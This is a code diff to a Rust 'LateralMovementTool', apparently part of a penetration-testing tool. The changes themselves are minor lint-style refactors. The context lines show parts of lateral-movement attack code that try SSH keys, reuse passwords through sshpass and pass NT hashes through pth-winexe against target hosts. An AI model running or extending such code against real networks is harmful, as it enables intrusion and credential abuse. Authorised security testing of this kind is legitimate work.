@@ -46,7 +46,7 @@ impl LateralMovementTool {
         );
 
         let output = Command::new("ssh")
-            .args(&[
+            .args([
                 "-i",
                 key_path,
                 "-o",
@@ -78,7 +78,7 @@ impl LateralMovementTool {
             success,
             method_details: format!(
                 "SSH key {} for user {}",
-                key_path.split('/').last().unwrap_or(key_path),
+                key_path.split('/').next_back().unwrap_or(key_path),
                 username
             ),
             access_level,
@@ -94,7 +94,7 @@ impl LateralMovementTool {
         tracing::info!("Attempting credential reuse: {}@{}", username, target);
 
         let output = Command::new("sshpass")
-            .args(&[
+            .args([
                 "-p",
                 password,
                 "ssh",
@@ -198,7 +198,7 @@ impl LateralMovementTool {
 
         // Use pth-winexe if available (part of passing-the-hash toolkit)
         let output = Command::new("pth-winexe")
-            .args(&[
+            .args([
                 "-U",
                 &format!("{}%{}", username, nt_hash),
                 &format!("//{}", target),
@@ -240,7 +240,7 @@ impl LateralMovementTool {
     }
 
     /// Scan for SSH key reuse across multiple hosts
-    async fn scan_ssh_key_reuse(
+    pub async fn scan_ssh_key_reuse(
         targets: Vec<String>,
         ssh_keys: Vec<(String, String)>, // (key_path, username)
     ) -> Vec<LateralMovementResult> {
